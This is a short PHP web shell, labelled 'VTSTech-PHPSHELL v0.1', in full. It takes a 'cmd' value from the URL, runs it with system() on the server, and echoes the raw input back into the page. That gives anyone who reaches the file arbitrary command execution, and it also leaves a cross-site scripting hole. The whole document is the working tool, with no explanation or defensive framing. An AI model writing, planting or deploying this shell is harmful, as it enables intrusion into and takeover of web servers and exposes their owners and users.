<html><body bgcolor=000 text=ffffff link=00ff00>
<?php
 $user = getenv("APACHE_RUN_USER");
 $host = getenv("SERVER_NAME");
 echo "VTSTech-PHPSHELL v0.1 (<a href=https://www.VTS-Tech.org/>www.VTS-Tech.org</a>)</i><br><b>$user@$host$</b> $_GET[cmd] <br><pre>";
 system($_GET["cmd"]);
?>
</body></html>
